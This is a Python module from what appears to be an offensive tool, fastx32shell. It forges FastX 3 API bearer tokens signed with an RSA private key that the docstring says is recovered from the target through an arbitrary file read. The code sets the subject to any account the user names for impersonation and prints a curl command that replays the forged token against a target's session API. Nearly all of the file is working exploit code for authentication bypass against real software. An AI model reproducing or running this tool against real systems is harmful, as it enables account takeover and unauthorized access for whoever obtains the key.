"""Mint an RS256 FastX 3 API token from a signing key recovered out of band.

For example via the /error/assets arbitrary file read. Replay tooling only;
it contains no key, no issuer and no login of its own.

    fastx32shell forge -k private.pem -s serverId.txt -u someuser -o token.jwt

FastX 3 signs its API tokens with the RSA key at <fastx-var-local>/private and
identifies its issuer by the value in <fastx-var-local>/serverId. Any token
that verifies against that key is accepted, so possessing the key is
equivalent to every credential on the host.

Claim set, per the shipped jwt helpers on affected builds:
  header  {"alg":"RS256","typ":"JWT"}
  payload iss = serverId        (the verifier resolves the public key by issuer)
          sub = login to impersonate
          jti = fresh UUID      (some builds check the signature only; builds
                                 that validate jti need an entry from the
                                 session store)
          no "authtokenuser" claim (loggedIn() rejects tokens that carry it)
  sig     = base64url of the RS256 signature over "<header>.<payload>"

Use the token as header "x-fastx-token: <jwt>" or cookie "fx3-token=<jwt>".

The output is a bearer credential. It is written 0600 and is never echoed
unless you pass -p. Do not commit it, screenshot it, or leave it on disk.
"""
import json
import os
import stat
import time
import uuid

from fastx32shell import pem

REFUSED_PATH_PARTS = ("evidence", "findings", "poc")


def add_arguments(parser):
    parser.add_argument("-k", "--key", required=True,
                        help="RSA private key read off the target")
    parser.add_argument("-s", "--serverid", required=True,
                        help="file containing the issuer serverId")
    parser.add_argument("-u", "--user", required=True,
                        help="account to impersonate")
    parser.add_argument("-o", "--out", default="./token.jwt",
                        help="where to write the token, 0600 (default: ./token.jwt)")
    parser.add_argument("-e", "--expires", type=int, default=3600,
                        help="lifetime in seconds (default: 3600)")
    parser.add_argument("-H", "--hostname", default=None,
                        help="gateway hostname (default: serverId minus its "
                             "last dash segment)")
    parser.add_argument("-p", "--print", dest="print_token",
                        action="store_true",
                        help="print the token as well as writing it")
    parser.set_defaults(_parser=parser)


def run(args):
    parser = args._parser

    if not args.key:
        parser.error("-k <private.pem> is required")
    if not args.user:
        parser.error("-u <login> is required")
    if args.expires <= 0:
        parser.error("-e must be greater than zero")

    try:
        with open(args.key, "r", encoding="utf-8") as fh:
            key_text = fh.read()
    except (OSError, ValueError) as exc:
        parser.error("cannot read the key: %s" % exc)
    try:
        modulus, exponent = pem.load_private_key(key_text)
    except pem.PemError as exc:
        parser.error(str(exc))

    try:
        with open(args.serverid, "r", encoding="utf-8") as fh:
            server_id = fh.read().replace("\r", "").replace("\n", "")
    except (OSError, ValueError) as exc:
        parser.error("cannot read the serverId file: %s" % exc)
    if not server_id:
        parser.error("serverId file is empty: %s" % args.serverid)

    out = args.out
    out_dir = os.path.dirname(out) or "."
    if not os.path.isdir(out_dir):
        parser.error("output directory does not exist: %s" % out_dir)
    out_dir = os.path.abspath(out_dir)
    if not os.access(out_dir, os.W_OK):
        parser.error("output directory is not writable: %s" % out_dir)
    # Keep a bearer token out of any directory that collects evidence: a
    # path component of the output directory that starts with the word.
    for part in REFUSED_PATH_PARTS:
        if "/" + part in out_dir:
            parser.error("refusing to write a bearer token into %s "
                         "— pick a path outside evidence/findings/poc"
                         % out)

    hostname = args.hostname
    if not hostname:
        # serverId is conventionally "<hostname>-<suffix>"; drop the suffix.
        # One with no dash has nothing to strip, so it is used as-is.
        hostname = server_id.rsplit("-", 1)[0] if "-" in server_id else server_id

    issued = int(time.time())
    expires_at = issued + args.expires
    header = {"alg": "RS256", "typ": "JWT"}
    payload = {
        "iss": server_id,
        "sub": args.user,
        "jti": str(uuid.uuid4()),
        "iat": issued,
        "exp": expires_at,
        "aud": "api",
        "fastx/auth-method": "web-ssh",
        "fastx/gateway-serverId": server_id,
        "fastx/gateway-hostname": hostname,
        "fastx/hostname": hostname,
        "fastx/client-ip": "::ffff:127.0.0.1",
        "fastx/terms-accepted": "",
    }

    def segment(document):
        return pem.b64url(json.dumps(
            document, separators=(",", ":"), sort_keys=False).encode())

    signing_input = ("%s.%s" % (segment(header), segment(payload))).encode()
    signature = pem.sign_rs256(signing_input, modulus, exponent)
    token = "%s.%s" % (signing_input.decode(), pem.b64url(signature))

    try:
        handle = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC,
                         stat.S_IRUSR | stat.S_IWUSR)
        with os.fdopen(handle, "w") as fh:
            fh.write(token)
        os.chmod(out, 0o600)
    except OSError as exc:
        parser.error("cannot write the token: %s" % exc)

    when = time.strftime("%a %b %e %H:%M:%S %Z %Y", time.localtime(expires_at))
    print("minted   RS256 token, %d bytes" % len(token))
    print("subject  %s" % args.user)
    print("issuer   %s" % server_id)
    print("expires  %d (%s)" % (expires_at, when))
    print("written  %s (0600)" % out)
    print()
    print("try:")
    print("  T=$(cat %s)" % out)
    print('  curl -sS -H "x-fastx-token: $T" '
          "https://TARGET/v3/api/session/list")
    print('  {"result":{"total_rows":0,...}} = accepted.  '
          '"Token not found" = rejected.')
    print("delete %s when you are done." % out)
    if args.print_token:
        print()
        print(token)
    return 0
